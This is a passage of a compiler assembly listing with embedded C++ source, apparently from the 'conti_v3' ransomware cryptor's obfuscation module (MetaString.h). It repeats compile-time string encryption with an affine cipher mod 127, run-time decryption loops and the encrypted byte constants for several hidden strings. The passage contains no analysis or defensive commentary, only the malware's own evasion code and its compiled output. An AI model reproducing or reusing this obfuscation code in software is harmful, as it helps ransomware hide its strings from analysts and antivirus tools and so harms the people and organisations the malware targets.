; 73   :     constexpr unsigned char __forceinline encrypt(unsigned char byte) const
; 74   :     {
; 75   :         return (A * byte + B) % 127;
; 76   :     }
; 77   : 
; 78   :     constexpr unsigned char __forceinline decrypt(unsigned char byte) const
; 79   :     {
; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);
; 81   :     }
; 82   : 
; 83   :     volatile bool m_isDecrypted = false;

  00000	c6 01 00	 mov	 BYTE PTR [rcx], 0
  00003	c6 41 01 49	 mov	 BYTE PTR [rcx+1], 73	; 00000049H
  00007	c6 41 02 00	 mov	 BYTE PTR [rcx+2], 0
  0000b	c6 41 03 44	 mov	 BYTE PTR [rcx+3], 68	; 00000044H
  0000f	c6 41 04 00	 mov	 BYTE PTR [rcx+4], 0
  00013	c6 41 05 42	 mov	 BYTE PTR [rcx+5], 66	; 00000042H
  00017	c6 41 06 00	 mov	 BYTE PTR [rcx+6], 0
  0001b	c6 41 07 6d	 mov	 BYTE PTR [rcx+7], 109	; 0000006dH
  0001f	c6 41 08 00	 mov	 BYTE PTR [rcx+8], 0
  00023	c6 41 09 00	 mov	 BYTE PTR [rcx+9], 0
  00027	c6 41 0a 00	 mov	 BYTE PTR [rcx+10], 0
  0002b	0f b6 41 01	 movzx	 eax, BYTE PTR [rcx+1]
  0002f	48 8b c1	 mov	 rax, rcx
  00032	c3		 ret	 0
??0?$MetaBuffer@$0CL@$0A@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEAA@PEBE@Z ENDP ; MetaBuffer<43,0,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::MetaBuffer<43,0,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?decrypt@?$MetaBuffer@$0GB@$0EL@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEAAPEBDXZ
_TEXT	SEGMENT
this$ = 8
?decrypt@?$MetaBuffer@$0GB@$0EL@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEAAPEBDXZ PROC ; MetaBuffer<97,75,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::decrypt, COMDAT

; 58   :         return m_isDecrypted;

  00000	0f b6 01	 movzx	 eax, BYTE PTR [rcx]
  00003	4c 8d 49 01	 lea	 r9, QWORD PTR [rcx+1]

; 63   :         if (!isDecrypted())

  00007	84 c0		 test	 al, al
  00009	75 68		 jne	 SHORT $LN17@decrypt

; 64   :         {
; 65   :             for (size_t i = 0; i < sizeof...(Ints); ++i)

  0000b	4d 8b d1	 mov	 r10, r9
  0000e	41 bb 0a 00 00
	00		 mov	 r11d, 10
  00014	0f 1f 40 00 0f
	1f 84 00 00 00
	00 00		 npad	 12
$LL4@decrypt:

; 66   :                 m_buffer[i] = decrypt(m_buffer[i]);

  00020	41 0f b6 0a	 movzx	 ecx, BYTE PTR [r10]
  00024	4d 8d 52 01	 lea	 r10, QWORD PTR [r10+1]

; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);

  00028	83 e9 4b	 sub	 ecx, 75			; 0000004bH

; 40   :     return (a % n + n) % n;

  0002b	b8 09 04 02 81	 mov	 eax, -2130574327	; ffffffff81020409H

; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);

  00030	44 6b c1 37	 imul	 r8d, ecx, 55		; 00000037H

; 40   :     return (a % n + n) % n;

  00034	41 f7 e8	 imul	 r8d
  00037	41 03 d0	 add	 edx, r8d
  0003a	c1 fa 06	 sar	 edx, 6
  0003d	8b c2		 mov	 eax, edx
  0003f	c1 e8 1f	 shr	 eax, 31
  00042	03 d0		 add	 edx, eax
  00044	6b c2 7f	 imul	 eax, edx, 127		; 0000007fH
  00047	44 2b c0	 sub	 r8d, eax
  0004a	b8 09 04 02 81	 mov	 eax, -2130574327	; ffffffff81020409H
  0004f	41 83 c0 7f	 add	 r8d, 127		; 0000007fH
  00053	41 f7 e8	 imul	 r8d
  00056	41 03 d0	 add	 edx, r8d
  00059	c1 fa 06	 sar	 edx, 6
  0005c	8b c2		 mov	 eax, edx
  0005e	c1 e8 1f	 shr	 eax, 31
  00061	03 d0		 add	 edx, eax
  00063	6b c2 7f	 imul	 eax, edx, 127		; 0000007fH
  00066	44 2b c0	 sub	 r8d, eax

; 66   :                 m_buffer[i] = decrypt(m_buffer[i]);

  00069	45 88 42 ff	 mov	 BYTE PTR [r10-1], r8b
  0006d	49 83 eb 01	 sub	 r11, 1
  00071	75 ad		 jne	 SHORT $LL4@decrypt
$LN17@decrypt:

; 67   :         }
; 68   : 
; 69   :         return (const char*)m_buffer;
; 70   :     }

  00073	49 8b c1	 mov	 rax, r9
  00076	c3		 ret	 0
?decrypt@?$MetaBuffer@$0GB@$0EL@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEAAPEBDXZ ENDP ; MetaBuffer<97,75,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::decrypt
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ??0?$MetaBuffer@$0GB@$0EL@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEAA@PEBE@Z
_TEXT	SEGMENT
this$ = 8
data$dead$ = 16
??0?$MetaBuffer@$0GB@$0EL@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEAA@PEBE@Z PROC ; MetaBuffer<97,75,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::MetaBuffer<97,75,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >, COMDAT

; 55   : 
; 56   :     inline bool isDecrypted() const
; 57   :     {
; 58   :         return m_isDecrypted;
; 59   :     }
; 60   : 
; 61   :     inline const char* decrypt()
; 62   :     {
; 63   :         if (!isDecrypted())
; 64   :         {
; 65   :             for (size_t i = 0; i < sizeof...(Ints); ++i)
; 66   :                 m_buffer[i] = decrypt(m_buffer[i]);
; 67   :         }
; 68   : 
; 69   :         return (const char*)m_buffer;
; 70   :     }
; 71   : 
; 72   : private:
; 73   :     constexpr unsigned char __forceinline encrypt(unsigned char byte) const
; 74   :     {
; 75   :         return (A * byte + B) % 127;
; 76   :     }
; 77   : 
; 78   :     constexpr unsigned char __forceinline decrypt(unsigned char byte) const
; 79   :     {
; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);
; 81   :     }
; 82   : 
; 83   :     volatile bool m_isDecrypted = false;

  00000	c6 01 00	 mov	 BYTE PTR [rcx], 0
  00003	c6 41 01 5c	 mov	 BYTE PTR [rcx+1], 92	; 0000005cH
  00007	c6 41 02 4b	 mov	 BYTE PTR [rcx+2], 75	; 0000004bH
  0000b	c6 41 03 5d	 mov	 BYTE PTR [rcx+3], 93	; 0000005dH
  0000f	c6 41 04 4b	 mov	 BYTE PTR [rcx+4], 75	; 0000004bH
  00013	c6 41 05 1f	 mov	 BYTE PTR [rcx+5], 31
  00017	c6 41 06 4b	 mov	 BYTE PTR [rcx+6], 75	; 0000004bH
  0001b	c6 41 07 38	 mov	 BYTE PTR [rcx+7], 56	; 00000038H
  0001f	c6 41 08 4b	 mov	 BYTE PTR [rcx+8], 75	; 0000004bH
  00023	c6 41 09 4b	 mov	 BYTE PTR [rcx+9], 75	; 0000004bH
  00027	c6 41 0a 4b	 mov	 BYTE PTR [rcx+10], 75	; 0000004bH
  0002b	0f b6 41 01	 movzx	 eax, BYTE PTR [rcx+1]
  0002f	48 8b c1	 mov	 rax, rcx
  00032	c3		 ret	 0
??0?$MetaBuffer@$0GB@$0EL@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEAA@PEBE@Z ENDP ; MetaBuffer<97,75,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::MetaBuffer<97,75,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?decrypt@?$MetaBuffer@$0GL@$09U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@@std@@@@QEAAPEBDXZ
_TEXT	SEGMENT
this$ = 8
?decrypt@?$MetaBuffer@$0GL@$09U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@@std@@@@QEAAPEBDXZ PROC ; MetaBuffer<107,10,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11> >::decrypt, COMDAT

; 58   :         return m_isDecrypted;

  00000	0f b6 01	 movzx	 eax, BYTE PTR [rcx]
  00003	4c 8d 49 01	 lea	 r9, QWORD PTR [rcx+1]

; 63   :         if (!isDecrypted())

  00007	84 c0		 test	 al, al
  00009	75 68		 jne	 SHORT $LN17@decrypt

; 64   :         {
; 65   :             for (size_t i = 0; i < sizeof...(Ints); ++i)

  0000b	4d 8b d1	 mov	 r10, r9
  0000e	41 bb 0c 00 00
	00		 mov	 r11d, 12
  00014	0f 1f 40 00 0f
	1f 84 00 00 00
	00 00		 npad	 12
$LL4@decrypt:

; 66   :                 m_buffer[i] = decrypt(m_buffer[i]);

  00020	41 0f b6 0a	 movzx	 ecx, BYTE PTR [r10]
  00024	4d 8d 52 01	 lea	 r10, QWORD PTR [r10+1]

; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);

  00028	83 e9 0a	 sub	 ecx, 10

; 40   :     return (a % n + n) % n;

  0002b	b8 09 04 02 81	 mov	 eax, -2130574327	; ffffffff81020409H

; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);

  00030	44 6b c1 13	 imul	 r8d, ecx, 19

; 40   :     return (a % n + n) % n;

  00034	41 f7 e8	 imul	 r8d
  00037	41 03 d0	 add	 edx, r8d
  0003a	c1 fa 06	 sar	 edx, 6
  0003d	8b c2		 mov	 eax, edx
  0003f	c1 e8 1f	 shr	 eax, 31
  00042	03 d0		 add	 edx, eax
  00044	6b c2 7f	 imul	 eax, edx, 127		; 0000007fH
  00047	44 2b c0	 sub	 r8d, eax
  0004a	b8 09 04 02 81	 mov	 eax, -2130574327	; ffffffff81020409H
  0004f	41 83 c0 7f	 add	 r8d, 127		; 0000007fH
  00053	41 f7 e8	 imul	 r8d
  00056	41 03 d0	 add	 edx, r8d
  00059	c1 fa 06	 sar	 edx, 6
  0005c	8b c2		 mov	 eax, edx
  0005e	c1 e8 1f	 shr	 eax, 31
  00061	03 d0		 add	 edx, eax
  00063	6b c2 7f	 imul	 eax, edx, 127		; 0000007fH
  00066	44 2b c0	 sub	 r8d, eax

; 66   :                 m_buffer[i] = decrypt(m_buffer[i]);

  00069	45 88 42 ff	 mov	 BYTE PTR [r10-1], r8b
  0006d	49 83 eb 01	 sub	 r11, 1
  00071	75 ad		 jne	 SHORT $LL4@decrypt
$LN17@decrypt:

; 67   :         }
; 68   : 
; 69   :         return (const char*)m_buffer;
; 70   :     }

  00073	49 8b c1	 mov	 rax, r9
  00076	c3		 ret	 0
?decrypt@?$MetaBuffer@$0GL@$09U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@@std@@@@QEAAPEBDXZ ENDP ; MetaBuffer<107,10,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11> >::decrypt
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ??0?$MetaBuffer@$0GL@$09U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@@std@@@@QEAA@PEBE@Z
_TEXT	SEGMENT
this$ = 8
data$dead$ = 16
??0?$MetaBuffer@$0GL@$09U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@@std@@@@QEAA@PEBE@Z PROC ; MetaBuffer<107,10,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11> >::MetaBuffer<107,10,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11> >, COMDAT

; 55   : 
; 56   :     inline bool isDecrypted() const
; 57   :     {
; 58   :         return m_isDecrypted;
; 59   :     }
; 60   : 
; 61   :     inline const char* decrypt()
; 62   :     {
; 63   :         if (!isDecrypted())
; 64   :         {
; 65   :             for (size_t i = 0; i < sizeof...(Ints); ++i)
; 66   :                 m_buffer[i] = decrypt(m_buffer[i]);
; 67   :         }
; 68   : 
; 69   :         return (const char*)m_buffer;
; 70   :     }
; 71   : 
; 72   : private:
; 73   :     constexpr unsigned char __forceinline encrypt(unsigned char byte) const
; 74   :     {
; 75   :         return (A * byte + B) % 127;
; 76   :     }
; 77   : 
; 78   :     constexpr unsigned char __forceinline decrypt(unsigned char byte) const
; 79   :     {
; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);
; 81   :     }
; 82   : 
; 83   :     volatile bool m_isDecrypted = false;

  00000	c6 01 00	 mov	 BYTE PTR [rcx], 0
  00003	c6 41 01 6a	 mov	 BYTE PTR [rcx+1], 106	; 0000006aH
  00007	c6 41 02 0a	 mov	 BYTE PTR [rcx+2], 10
  0000b	c6 41 03 16	 mov	 BYTE PTR [rcx+3], 22
  0000f	c6 41 04 0a	 mov	 BYTE PTR [rcx+4], 10
  00013	c6 41 05 38	 mov	 BYTE PTR [rcx+5], 56	; 00000038H
  00017	c6 41 06 0a	 mov	 BYTE PTR [rcx+6], 10
  0001b	c6 41 07 45	 mov	 BYTE PTR [rcx+7], 69	; 00000045H
  0001f	c6 41 08 0a	 mov	 BYTE PTR [rcx+8], 10
  00023	c6 41 09 74	 mov	 BYTE PTR [rcx+9], 116	; 00000074H
  00027	c6 41 0a 0a	 mov	 BYTE PTR [rcx+10], 10
  0002b	c6 41 0b 0a	 mov	 BYTE PTR [rcx+11], 10
  0002f	c6 41 0c 0a	 mov	 BYTE PTR [rcx+12], 10
  00033	0f b6 41 01	 movzx	 eax, BYTE PTR [rcx+1]
  00037	48 8b c1	 mov	 rax, rcx
  0003a	c3		 ret	 0
??0?$MetaBuffer@$0GL@$09U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@@std@@@@QEAA@PEBE@Z ENDP ; MetaBuffer<107,10,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11> >::MetaBuffer<107,10,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11> >
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?decrypt@?$MetaBuffer@$0GN@$0P@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEAAPEBDXZ
_TEXT	SEGMENT
this$ = 8
?decrypt@?$MetaBuffer@$0GN@$0P@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEAAPEBDXZ PROC ; MetaBuffer<109,15,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::decrypt, COMDAT

; 58   :         return m_isDecrypted;

  00000	0f b6 01	 movzx	 eax, BYTE PTR [rcx]
  00003	4c 8d 49 01	 lea	 r9, QWORD PTR [rcx+1]

; 63   :         if (!isDecrypted())

  00007	84 c0		 test	 al, al
  00009	75 68		 jne	 SHORT $LN17@decrypt

; 64   :         {
; 65   :             for (size_t i = 0; i < sizeof...(Ints); ++i)

  0000b	4d 8b d1	 mov	 r10, r9
  0000e	41 bb 0a 00 00
	00		 mov	 r11d, 10
  00014	0f 1f 40 00 0f
	1f 84 00 00 00
	00 00		 npad	 12
$LL4@decrypt:

; 66   :                 m_buffer[i] = decrypt(m_buffer[i]);

  00020	41 0f b6 0a	 movzx	 ecx, BYTE PTR [r10]
  00024	4d 8d 52 01	 lea	 r10, QWORD PTR [r10+1]

; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);

  00028	83 e9 0f	 sub	 ecx, 15

; 40   :     return (a % n + n) % n;

  0002b	b8 09 04 02 81	 mov	 eax, -2130574327	; ffffffff81020409H

; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);

  00030	44 6b c1 07	 imul	 r8d, ecx, 7

; 40   :     return (a % n + n) % n;

  00034	41 f7 e8	 imul	 r8d
  00037	41 03 d0	 add	 edx, r8d
  0003a	c1 fa 06	 sar	 edx, 6
  0003d	8b c2		 mov	 eax, edx
  0003f	c1 e8 1f	 shr	 eax, 31
  00042	03 d0		 add	 edx, eax
  00044	6b c2 7f	 imul	 eax, edx, 127		; 0000007fH
  00047	44 2b c0	 sub	 r8d, eax
  0004a	b8 09 04 02 81	 mov	 eax, -2130574327	; ffffffff81020409H
  0004f	41 83 c0 7f	 add	 r8d, 127		; 0000007fH
  00053	41 f7 e8	 imul	 r8d
  00056	41 03 d0	 add	 edx, r8d
  00059	c1 fa 06	 sar	 edx, 6
  0005c	8b c2		 mov	 eax, edx
  0005e	c1 e8 1f	 shr	 eax, 31
  00061	03 d0		 add	 edx, eax
  00063	6b c2 7f	 imul	 eax, edx, 127		; 0000007fH
  00066	44 2b c0	 sub	 r8d, eax

; 66   :                 m_buffer[i] = decrypt(m_buffer[i]);

  00069	45 88 42 ff	 mov	 BYTE PTR [r10-1], r8b
  0006d	49 83 eb 01	 sub	 r11, 1
  00071	75 ad		 jne	 SHORT $LL4@decrypt
$LN17@decrypt:

; 67   :         }
; 68   : 
; 69   :         return (const char*)m_buffer;
; 70   :     }

  00073	49 8b c1	 mov	 rax, r9
  00076	c3		 ret	 0
?decrypt@?$MetaBuffer@$0GN@$0P@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEAAPEBDXZ ENDP ; MetaBuffer<109,15,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::decrypt
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ??0?$MetaBuffer@$0GN@$0P@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEAA@PEBE@Z
_TEXT	SEGMENT
this$ = 8
data$dead$ = 16
??0?$MetaBuffer@$0GN@$0P@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEAA@PEBE@Z PROC ; MetaBuffer<109,15,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::MetaBuffer<109,15,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >, COMDAT

; 55   : 
; 56   :     inline bool isDecrypted() const
; 57   :     {
; 58   :         return m_isDecrypted;
; 59   :     }
; 60   : 
; 61   :     inline const char* decrypt()
; 62   :     {
; 63   :         if (!isDecrypted())
; 64   :         {
; 65   :             for (size_t i = 0; i < sizeof...(Ints); ++i)
; 66   :                 m_buffer[i] = decrypt(m_buffer[i]);
; 67   :         }
; 68   : 
; 69   :         return (const char*)m_buffer;
; 70   :     }
; 71   : 
; 72   : private:
; 73   :     constexpr unsigned char __forceinline encrypt(unsigned char byte) const
; 74   :     {
; 75   :         return (A * byte + B) % 127;
; 76   :     }
; 77   : 
; 78   :     constexpr unsigned char __forceinline decrypt(unsigned char byte) const
; 79   :     {
; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);
; 81   :     }
; 82   : 
; 83   :     volatile bool m_isDecrypted = false;

  00000	c6 01 00	 mov	 BYTE PTR [rcx], 0
  00003	c6 41 01 4c	 mov	 BYTE PTR [rcx+1], 76	; 0000004cH
  00007	c6 41 02 0f	 mov	 BYTE PTR [rcx+2], 15
  0000b	c6 41 03 66	 mov	 BYTE PTR [rcx+3], 102	; 00000066H
  0000f	c6 41 04 0f	 mov	 BYTE PTR [rcx+4], 15
  00013	c6 41 05 78	 mov	 BYTE PTR [rcx+5], 120	; 00000078H
  00017	c6 41 06 0f	 mov	 BYTE PTR [rcx+6], 15
  0001b	c6 41 07 1d	 mov	 BYTE PTR [rcx+7], 29
  0001f	c6 41 08 0f	 mov	 BYTE PTR [rcx+8], 15
  00023	c6 41 09 0f	 mov	 BYTE PTR [rcx+9], 15
  00027	c6 41 0a 0f	 mov	 BYTE PTR [rcx+10], 15
  0002b	0f b6 41 01	 movzx	 eax, BYTE PTR [rcx+1]
  0002f	48 8b c1	 mov	 rax, rcx
  00032	c3		 ret	 0
??0?$MetaBuffer@$0GN@$0P@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEAA@PEBE@Z ENDP ; MetaBuffer<109,15,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::MetaBuffer<109,15,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?decrypt@?$MetaBuffer@$0EP@$0DA@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEAAPEBDXZ
_TEXT	SEGMENT
this$ = 8
?decrypt@?$MetaBuffer@$0EP@$0DA@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEAAPEBDXZ PROC ; MetaBuffer<79,48,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::decrypt, COMDAT

; 58   :         return m_isDecrypted;

  00000	0f b6 01	 movzx	 eax, BYTE PTR [rcx]
  00003	4c 8d 41 01	 lea	 r8, QWORD PTR [rcx+1]

; 63   :         if (!isDecrypted())

  00007	84 c0		 test	 al, al
  00009	75 64		 jne	 SHORT $LN17@decrypt

; 64   :         {
; 65   :             for (size_t i = 0; i < sizeof...(Ints); ++i)

  0000b	4d 8b c8	 mov	 r9, r8
  0000e	41 ba 0a 00 00
	00		 mov	 r10d, 10
  00014	0f 1f 40 00 0f
	1f 84 00 00 00
	00 00		 npad	 12
$LL4@decrypt:

; 66   :                 m_buffer[i] = decrypt(m_buffer[i]);

  00020	41 0f b6 09	 movzx	 ecx, BYTE PTR [r9]
  00024	4d 8d 49 01	 lea	 r9, QWORD PTR [r9+1]

; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);

  00028	b8 30 00 00 00	 mov	 eax, 48			; 00000030H
  0002d	2b c1		 sub	 eax, ecx
  0002f	6b c8 2d	 imul	 ecx, eax, 45		; 0000002dH

; 40   :     return (a % n + n) % n;

  00032	b8 09 04 02 81	 mov	 eax, -2130574327	; ffffffff81020409H
  00037	f7 e9		 imul	 ecx
  00039	03 d1		 add	 edx, ecx
  0003b	c1 fa 06	 sar	 edx, 6
  0003e	8b c2		 mov	 eax, edx
  00040	c1 e8 1f	 shr	 eax, 31
  00043	03 d0		 add	 edx, eax
  00045	6b c2 7f	 imul	 eax, edx, 127		; 0000007fH
  00048	2b c8		 sub	 ecx, eax
  0004a	b8 09 04 02 81	 mov	 eax, -2130574327	; ffffffff81020409H
  0004f	83 c1 7f	 add	 ecx, 127		; 0000007fH
  00052	f7 e9		 imul	 ecx
  00054	03 d1		 add	 edx, ecx
  00056	c1 fa 06	 sar	 edx, 6
  00059	8b c2		 mov	 eax, edx
  0005b	c1 e8 1f	 shr	 eax, 31
  0005e	03 d0		 add	 edx, eax
  00060	6b c2 7f	 imul	 eax, edx, 127		; 0000007fH
  00063	2b c8		 sub	 ecx, eax

; 66   :                 m_buffer[i] = decrypt(m_buffer[i]);

  00065	41 88 49 ff	 mov	 BYTE PTR [r9-1], cl
  00069	49 83 ea 01	 sub	 r10, 1
  0006d	75 b1		 jne	 SHORT $LL4@decrypt
$LN17@decrypt:

; 67   :         }
; 68   : 
; 69   :         return (const char*)m_buffer;
; 70   :     }

  0006f	49 8b c0	 mov	 rax, r8
  00072	c3		 ret	 0
?decrypt@?$MetaBuffer@$0EP@$0DA@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEAAPEBDXZ ENDP ; MetaBuffer<79,48,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::decrypt
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ??0?$MetaBuffer@$0EP@$0DA@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEAA@PEBE@Z
_TEXT	SEGMENT
this$ = 8
data$dead$ = 16
??0?$MetaBuffer@$0EP@$0DA@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEAA@PEBE@Z PROC ; MetaBuffer<79,48,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::MetaBuffer<79,48,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >, COMDAT

; 55   : 
; 56   :     inline bool isDecrypted() const
; 57   :     {
; 58   :         return m_isDecrypted;
; 59   :     }
; 60   : 
; 61   :     inline const char* decrypt()
; 62   :     {
; 63   :         if (!isDecrypted())
; 64   :         {
; 65   :             for (size_t i = 0; i < sizeof...(Ints); ++i)
; 66   :                 m_buffer[i] = decrypt(m_buffer[i]);
; 67   :         }
; 68   : 
; 69   :         return (const char*)m_buffer;
; 70   :     }
; 71   : 
; 72   : private:
; 73   :     constexpr unsigned char __forceinline encrypt(unsigned char byte) const
; 74   :     {
; 75   :         return (A * byte + B) % 127;
; 76   :     }
; 77   : 
; 78   :     constexpr unsigned char __forceinline decrypt(unsigned char byte) const
; 79   :     {
; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);
; 81   :     }
; 82   : 
; 83   :     volatile bool m_isDecrypted = false;

  00000	c6 01 00	 mov	 BYTE PTR [rcx], 0
  00003	c6 41 01 7e	 mov	 BYTE PTR [rcx+1], 126	; 0000007eH
  00007	c6 41 02 30	 mov	 BYTE PTR [rcx+2], 48	; 00000030H
  0000b	c6 41 03 1a	 mov	 BYTE PTR [rcx+3], 26
  0000f	c6 41 04 30	 mov	 BYTE PTR [rcx+4], 48	; 00000030H
  00013	c6 41 05 7a	 mov	 BYTE PTR [rcx+5], 122	; 0000007aH
  00017	c6 41 06 30	 mov	 BYTE PTR [rcx+6], 48	; 00000030H
  0001b	c6 41 07 03	 mov	 BYTE PTR [rcx+7], 3
  0001f	c6 41 08 30	 mov	 BYTE PTR [rcx+8], 48	; 00000030H
  00023	c6 41 09 30	 mov	 BYTE PTR [rcx+9], 48	; 00000030H
  00027	c6 41 0a 30	 mov	 BYTE PTR [rcx+10], 48	; 00000030H
  0002b	0f b6 41 01	 movzx	 eax, BYTE PTR [rcx+1]
  0002f	48 8b c1	 mov	 rax, rcx
  00032	c3		 ret	 0
??0?$MetaBuffer@$0EP@$0DA@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEAA@PEBE@Z ENDP ; MetaBuffer<79,48,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::MetaBuffer<79,48,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?decrypt@?$MetaBuffer@$0CJ@$0ED@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEAAPEBDXZ
_TEXT	SEGMENT
this$ = 8
?decrypt@?$MetaBuffer@$0CJ@$0ED@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEAAPEBDXZ PROC ; MetaBuffer<41,67,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::decrypt, COMDAT

; 58   :         return m_isDecrypted;

  00000	0f b6 01	 movzx	 eax, BYTE PTR [rcx]
  00003	4c 8d 49 01	 lea	 r9, QWORD PTR [rcx+1]

; 63   :         if (!isDecrypted())

  00007	84 c0		 test	 al, al
  00009	75 68		 jne	 SHORT $LN17@decrypt

; 64   :         {
; 65   :             for (size_t i = 0; i < sizeof...(Ints); ++i)

  0000b	4d 8b d1	 mov	 r10, r9
  0000e	41 bb 0a 00 00
	00		 mov	 r11d, 10
  00014	0f 1f 40 00 0f
	1f 84 00 00 00
	00 00		 npad	 12
$LL4@decrypt:

; 66   :                 m_buffer[i] = decrypt(m_buffer[i]);

  00020	41 0f b6 0a	 movzx	 ecx, BYTE PTR [r10]
  00024	4d 8d 52 01	 lea	 r10, QWORD PTR [r10+1]

; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);

  00028	83 e9 43	 sub	 ecx, 67			; 00000043H

; 40   :     return (a % n + n) % n;

  0002b	b8 09 04 02 81	 mov	 eax, -2130574327	; ffffffff81020409H

; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);

  00030	44 6b c1 1f	 imul	 r8d, ecx, 31

; 40   :     return (a % n + n) % n;

  00034	41 f7 e8	 imul	 r8d
  00037	41 03 d0	 add	 edx, r8d
  0003a	c1 fa 06	 sar	 edx, 6
  0003d	8b c2		 mov	 eax, edx
  0003f	c1 e8 1f	 shr	 eax, 31
  00042	03 d0		 add	 edx, eax
